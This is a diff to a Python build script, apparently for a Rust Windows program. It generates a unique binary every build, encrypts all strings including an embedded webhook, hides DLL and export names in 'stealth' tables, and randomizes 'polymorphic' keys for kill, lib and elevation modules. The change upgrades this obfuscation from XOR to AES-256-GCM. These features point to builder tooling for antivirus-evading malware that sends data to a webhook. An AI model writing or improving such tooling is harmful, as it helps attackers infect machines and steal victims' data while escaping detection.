@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 Advanced Build System - Generates unique binary every build
-All strings encrypted, XOR keys randomized, PE modified per build.
+All strings AES-256-GCM encrypted, keys randomized per build, PE modified per build.
 Usage: python build.py
 """
 
@@ -49,12 +49,6 @@ def generate_random_prefix(length=3):
 
 def generate_random_suffix():
     return random.randint(1000, 9999)
-
-def generate_random_key():
-    return random.randint(1, 255)
-
-def xor_encrypt(url: str, key: int) -> list:
-    return [ord(c) ^ key for c in url]
 
 
 # ===== BUILD COMMANDS =====
@@ -113,14 +107,11 @@ def main():
     # Generate random parameters
     prefix = generate_random_prefix()
     suffix = generate_random_suffix()
-    xor_key = generate_random_key()
-    xor_bytes = xor_encrypt(webhook, xor_key)
     random_name = generate_random_name()
 
     print(f"\n[+] Build parameters:")
     print(f"    Prefix: {prefix}")
     print(f"    Suffix: {suffix}")
-    print(f"    XOR Key: 0x{xor_key:02X}")
     print(f"    Output: {random_name}.exe")
 
     # Step 1: Generate encrypted.rs with all strings + webhook
@@ -137,7 +128,7 @@ def main():
         sys.exit(1)
     print(f"[+] Generated {ENCRYPTED_RS} ({os.path.getsize(ENCRYPTED_RS)} bytes)")
 
-    # Step 1b: Generate per-build stealth decryption tables (unique XOR key + encrypted DLL/export names)
+    # Step 1b: Generate per-build stealth decryption tables (unique AES-256-GCM keys per DLL/export name)
     print("\n[*] Generating stealth tables...")
     generate_stealth_tables(STEALTH_RS)
     if not os.path.exists(STEALTH_RS):
@@ -145,8 +136,8 @@ def main():
         sys.exit(1)
     print(f"[+] Generated {STEALTH_RS}")
 
-    # Step 1c: Generate polymorphic XOR keys for kill.rs, lib.rs, elev.rs
-    print("\n[*] Generating polymorphic keys...")
+    # Step 1c: Generate polymorphic AES-256-GCM keys for kill.rs, lib.rs, api.rs
+    print("\n[*] Generating polymorphic AES keys...")
     generate_polymorphic_keys(os.path.join(PROJECT_ROOT, "src"))
     if not os.path.exists(POLYMORPHIC_RS):
         print("[!] Failed to generate polymorphic_keys.rs")
@@ -154,7 +145,6 @@ def main():
     print(f"[+] Generated {POLYMORPHIC_RS}")
 
     # Step 2: Set environment variables for build.rs
-    os.environ["PAYLOAD_XOR_KEY"] = str(xor_key)
     os.environ["COMPILE_PREFIX"] = prefix
     os.environ["COMPILE_SUFFIX"] = str(suffix)
 
